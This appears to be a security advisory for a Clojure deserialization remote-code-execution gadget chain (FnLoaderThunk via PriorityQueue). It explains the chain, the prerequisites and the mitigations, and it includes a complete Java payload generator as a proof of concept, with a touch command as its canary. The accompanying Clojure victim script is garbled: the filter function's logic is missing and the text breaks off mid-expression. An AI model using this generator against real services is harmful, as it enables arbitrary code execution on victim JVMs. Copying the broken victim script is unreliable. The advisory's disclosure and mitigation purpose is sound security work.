GHSA-q527-rxcp-97g8.description: ### Summary When a serialized input containing `clojure.lang.FnLoaderThunk` is deserialized via [`java.io.ObjectInputStream.readObject()`](https://docs.oracle.com/en/java/docs/api/java.base/java/io/ObjectInputStream.html#readObject()), an attacker is able to achieve remote code execution. Applications that use a broad `ObjectInputFilter` admitting the `clojure.lang.*` package prefix are vulnerable to remote code execution when they deserialize attacker-controlled Java objects. A crafted `java.util.PriorityQueue` whose comparator is a `clojure.lang.FnLoaderThunk` wired to `clojure.core/apply` triggers `(apply eval [<attacker-form>])` automatically inside `ObjectInputStream.readObject()`, before any application-level validation can run. The filter bypass works because the dangerous capability (live references to `clojure.core/apply` and `clojure.core/eval`) is acquired from the victim JVM's running namespace via `Var$Serialized.readResolve`, not deserialized from the attacker's bytes. Every class in the 14-class object graph belongs to `java.util` or `clojure.lang`; all are approved by name before the chain fires. ### Details #### Object graph The serialized payload is a `PriorityQueue` with two fields populated by reflection (bypassing normal insertion to avoid triggering the comparator in the generator JVM): ``` java.util.PriorityQueue ├── comparator: clojure.lang.FnLoaderThunk │ ├── fn: Var identity → clojure.core/apply │ └── loader: null (forces fn field path in FnLoaderThunk.compare) └── queue[2] ├── [0]: Var identity → clojure.core/eval └── [1]: PersistentList → (<attacker-controlled-form>) ``` The stream does not contain any compiled function bytecode. It contains only: - Class names from `java.util` and `clojure.lang` - Two Var identities (namespace + symbol strings) - Clojure data structures (lists, vectors, symbols, strings) representing the form #### Exploit prerequisites The exploit requires all four of the following conditions in the victim application: 1. **Attacker-controlled bytes reach `ObjectInputStream.readObject()`**, via HTTP, a message queue, a cache, an RMI endpoint, or any other transport. 2. **The `ObjectInputFilter` admits the described class set**, specifically `PriorityQueue`, object arrays, `String`, and any class in `clojure.lang.*`. This is a common pattern for Clojure services that attempt to restrict deserialization by package prefix. 3. **`clojure.core` is initialized**, normal for any running Clojure application. 4. **No exact-class allowlist blocks `PriorityQueue`, `FnLoaderThunk`, `AFunction`, or `Var`.** #### Gadget chain ``` ObjectInputStream.readObject() → Var$Serialized.readResolve() — reconnects eval and apply from victim namespace → PriorityQueue.readObject() → heapify() → siftDownUsingComparator() → Comparator.compare(eval-var, eval-arguments) → AFunction.compare(o1, o2) — casts result to Number → FnLoaderThunk.invoke(o1, o2) — delegates to fn field → apply.invoke(eval, [form]) → Compiler.eval(form) — arbitrary code execution ``` The form that `Compiler.eval` receives is whatever `PersistentList` of Clojure data the attacker embedded in the payload. This can invoke any Java API reachable from the victim JVM, with the full authority of the deserializing process. #### Why `AFunction.compare` must return a `Number` `AFunction.compare(o1, o2)` calls `invoke(o1, o2)` and immediately casts the result to `Number` to call `intValue()`. If the form returns `null` (e.g., from a bare `ProcessBuilder` call without a `let` binding), the cast throws `NullPointerException` and the chain aborts before producing any observable effect. A correct payload must ensure its form returns a numeric value. ### PoC A two-JVM proof of concept is included in this advisory: - `GadgetGenerator.java`: builds and serializes the payload in a separate JVM with `--add-opens=java.base/java.util=ALL-UNNAMED`. Uses `/usr/bin/touch` as a safe canary. - `PocVictimApp.clj`: deserializes the payload through the vulnerable package-prefix filter. Runs without `--add-opens`; `GadgetGenerator` must be absent from the classpath. **The generator class is absent from the consumer classpath and serialized stream.** Quick run (requires Clojure sources compiled to a `CLASSPATH`): ```sh DEMO=$(mktemp -d /tmp/clojure-deser-XXXXXX) # Generator JVM: needs --add-opens to write to PriorityQueue internals java --add-opens=java.base/java.util=ALL-UNNAMED \ -cp '$CLASSPATH:generator-classes' \ GadgetGenerator '$DEMO/payload.bin' '$DEMO/marker' # Consumer: Clojure script — no --add-opens; no generator class on classpath java -cp '$CLASSPATH' clojure.main PocVictimApp.clj \ '$DEMO/payload.bin' '$DEMO/marker' ``` Expected consumer output: ``` restored-root: java.util.PriorityQueue filter-seen: [java.util.PriorityQueue, clojure.lang.FnLoaderThunk, ...] marker-created: true exit-code: 0 VERIFIED: gadget executed during ObjectInputStream.readObject() ``` ### Impact Remote Code Execution. Any program on the JVM may read serialized objects via [`java.io.ObjectInputStream.readObject()`](https://docs.oracle.com/en/java/docs/api/java.base/java/io/ObjectInputStream.html#readObject()). Reading serialized objects from an untrusted source is **inherently unsafe** and is a prerequisite for this vulnerability. ### Mitigation Mitigate this via one of the following: * Do not deserialize data from untrusted sources, this is inherently dangerous. * Per the Java guidelines on [deserialization filtering](https://docs.oracle.com/en/java/javase/17/core/serialization-filtering1.html#GUID-55BABE96-3048-4A9F-A7E6-781790FF3480), configure either a JVM-level or stream-specific [ObjectInputFilter](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/ObjectInputFilter.html) to reject the class `clojure.lang.FnLoaderThunk`. * Use Clojure ≥ 1.12.6 where FnLoaderThunk will throw on both serialization and deserialization, preventing this gadget from working. ### Scripts - GadgetGenerator.java ```java import clojure.lang.FnLoaderThunk; import clojure.lang.PersistentList; import clojure.lang.PersistentVector; import clojure.lang.RT; import clojure.lang.Symbol; import clojure.lang.Var; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.LinkOption; import java.nio.file.Path; import java.nio.file.StandardOpenOption; import java.util.Comparator; import java.util.List; import java.util.PriorityQueue; /** * Proof-of-concept payload generator for the Clojure filtered-deserialization RCE finding. * * Builds a PriorityQueue whose comparator is a FnLoaderThunk delegating to * clojure.core/apply, with queue elements [#'clojure.core/eval, [form]]. * * During deserialization on the victim side, PriorityQueue.readObject() calls * heapify(), which calls siftDownUsingComparator(), which calls Comparator.compare(). * That call chains through FnLoaderThunk → apply → eval → attacker form. * * Canary effect: the form runs `/usr/bin/touch <marker>`, captures the exit code, * writes it to the marker file, and returns it as an Integer — satisfying the * Number cast in AFunction.compare(). The consumer verifies the marker was created * and its content is '0'. * * Requires: --add-opens=java.base/java.util=ALL-UNNAMED (generator JVM only). * The consumer JVM needs no special flags. */ public final class GadgetGenerator { private GadgetGenerator() {} private static Field field(Class<?> type, String name) throws Exception { Field f = type.getDeclaredField(name); f.setAccessible(true); return f; } private static Path checkedTemporaryPath(String raw) throws Exception { Path requested = Path.of(raw).toAbsolutePath().normalize(); Path fileName = requested.getFileName(); Path parent = requested.getParent(); if (fileName == null || parent == null || !Files.isDirectory(parent)) { throw new IllegalArgumentException('path must be below an existing directory: ' + raw); } Path temporaryRoot = Path.of('/tmp').toRealPath(); Path realParent = parent.toRealPath(); if (!realParent.startsWith(temporaryRoot)) { throw new IllegalArgumentException('path must remain below /tmp: ' + raw); } return realParent.resolve(fileName.toString()); } private static void refuseExisting(Path path, String label) { if (Files.exists(path, LinkOption.NOFOLLOW_LINKS)) { throw new IllegalStateException('refusing to overwrite existing ' + label + ': ' + path); } } /** * Builds the gadget object graph without invoking the comparator in this JVM. * * The form structure: * (let [exit-code (.waitFor (.start (ProcessBuilder. ['/usr/bin/touch' marker])))] * (clojure.core/spit marker (clojure.core/str exit-code)) * exit-code) * * The let binding is required: AFunction.compare casts the comparator result to Number. * A form that returns nil (e.g. a bare ProcessBuilder call) causes NullPointerException * at the cast and the chain aborts without producing any observable effect. */ @SuppressWarnings({'rawtypes', 'unchecked'}) static PriorityQueue<Object> buildGadget(Path marker) throws Exception { Var apply = RT.var('clojure.core', 'apply'); Var eval = RT.var('clojure.core', 'eval'); FnLoaderThunk comparator = new FnLoaderThunk(apply, 'unused'); field(FnLoaderThunk.class, 'loader').set(comparator, null); field(FnLoaderThunk.class, 'fn').set(comparator, apply); Object command = PersistentVector.create('/usr/bin/touch', marker.toString()); Object processBuilder = PersistentList.create(List.of( Symbol.intern('java.lang.ProcessBuilder.'), command)); Object start = PersistentList.create(List.of(Symbol.intern('.start'), processBuilder)); Object waitFor = PersistentList.create(List.of(Symbol.intern('.waitFor'), start)); Symbol exitCode = Symbol.intern('exit-code'); Object bindings = PersistentVector.create(exitCode, waitFor); Object exitCodeStr = PersistentList.create(List.of(Symbol.intern('clojure.core/str'), exitCode)); Object spit = PersistentList.create(List.of(Symbol.intern('clojure.core/spit'), marker.toString(), exitCodeStr)); Object form = PersistentList.create(List.of(Symbol.intern('let'), bindings, spit, exitCode)); Object evalArgs = PersistentList.create(List.of(form)); // Populate the queue's private internals directly to avoid triggering // heapify (and thus the gadget) in this JVM during element insertion. PriorityQueue<Object> queue = new PriorityQueue<>(2, (Comparator) comparator); field(PriorityQueue.class, 'queue').set(queue, new Object[]{eval, evalArgs}); field(PriorityQueue.class, 'size').setInt(queue, 2); return queue; } public static void main(String[] args) throws Exception { if (args.length != 2) { System.err.println('usage: GadgetGenerator PAYLOAD_PATH MARKER_PATH'); System.err.println(' Both paths must be below /tmp.'); System.exit(1); } Path payload = checkedTemporaryPath(args[0]); Path marker = checkedTemporaryPath(args[1]); refuseExisting(payload, 'payload'); refuseExisting(marker, 'marker'); PriorityQueue<Object> gadget = buildGadget(marker); try (ObjectOutputStream out = new ObjectOutputStream( Files.newOutputStream(payload, StandardOpenOption.CREATE_NEW, StandardOpenOption.WRITE))) { out.writeObject(gadget); } System.out.println('generated: ' + payload); System.out.println('payload-bytes: ' + Files.size(payload)); System.out.println('serialized-comparator: ' + gadget.comparator().getClass().getName()); System.out.println('delegate-var: #'clojure.core/apply'); System.out.println('element-var: #'clojure.core/eval'); System.out.println('marker-exists-now: ' + Files.exists(marker)); } } ``` - PocVictimApp.clj ```clj ;;; Proof-of-concept victim application. ;;; ;;; Demonstrates that a broad clojure.lang.* package-prefix ObjectInputFilter ;;; does not prevent gadget chain execution. Deserializes the payload produced ;;; by GadgetGenerator.java through the vulnerable filter and asserts the canary ;;; marker was created with exit code 0. ;;; ;;; Run (no --add-opens required; generator class must be absent from classpath): ;;; java -cp '$CLASSPATH' clojure.main PocVictimApp.clj PAYLOAD_PATH MARKER_PATH ;;; ;;; Where CLASSPATH contains the compiled Clojure checkout sources and support JARs. (ns poc-victim-app (:require [clojure.string :as str]) (:import [java.io ObjectInputStream ObjectInputFilter ObjectInputFilter$Status] [java.nio.file Files LinkOption Path])) (defn- path-of ^Path [s] (Path/of s (make-array String 0))) (defn- no-link-opts [] (into-array LinkOption [LinkOption/NOFOLLOW_LINKS])) (defn- checked-temporary-path ^Path [raw] (let [requested (-> (path-of raw) .toAbsolutePath .normalize) file-name (.getFileName requested) parent (.getParent requested)] (when (or (nil? file-name) (nil? parent) (not (Files/isDirectory parent (make-array LinkOption 0)))) (throw (IllegalArgumentException. (str 'path must be below an existing directory: ' raw)))) (let [tmp-root (.toRealPath (path-of '/tmp') (make-array LinkOption 0)) real-parent (.toRealPath parent (make-array LinkOption 0))] (when-not (.startsWith real-parent tmp-root) (throw (IllegalArgumentException. (str 'path must remain below /tmp: ' raw)))) (.resolve real-parent (str file-name))))) (defn- package-prefix-filter 'The vulnerable filter: admits PriorityQueue and the full clojure.lang.* package by name prefix. This mirrors a common pattern in Clojure services that attempt to restrict deserialization to 'safe' Clojure runtime types. It does not prevent the gadget: Var$Serialized.readResolve() runs after the filter approves each class by name, and reconnects the approved Var identities to the live clojure.core/apply and clojure.core/eval functions in the victim JVM's namespace.' ObjectInputFilter$Status/ALLOWED ObjectInputFilter$Status/REJECTED)) ObjectInputFilter$Status/UNDECIDED)))) (defn -main [& args] (when (not= (count args) 2) (binding [*out* *err*] (println 'usage: java -cp \'$CLASSPATH\' clojure.main PocVictimApp.clj PAYLOAD_PATH MARKER_PATH')) (System/exit 1)) (let [[payload-arg marker-arg] args payload (checked-temporary-path payload-arg) marker (checked-temporary-path marker-arg)] (when-not (Files/isRegularFile payload (no-link-opts)) (throw (IllegalArgumentException. (str 'payload is not a regular file: ' payload)))) (when (Files/exists marker (no-link-opts)) (throw (IllegalStateException. (str 'refusing to overwrite existing marker: ' marker)))) (let [seen (java.util.LinkedHashSet.) restored (with-open [in (ObjectInputStream. (Files/newInputStream payload (make-array java.nio.file.OpenOption 0)))] (.setObjectInputFilter in (package-prefix-filter seen)) (.readObject in)) created (Files/isRegularFile marker (no-link-opts)) exit-code (if created (str/trim (Files/readString marker)) '<not created>')] (println 'restored-root: ' (.getName (.getClass restored))) (println 'filter-seen: ' (vec seen)) (println 'marker: ' (str marker)) (println 'marker-created:' created) (println 'exit-code: ' exit-code) (when (or (not created) (not= '0' exit-code)) (throw (AssertionError.
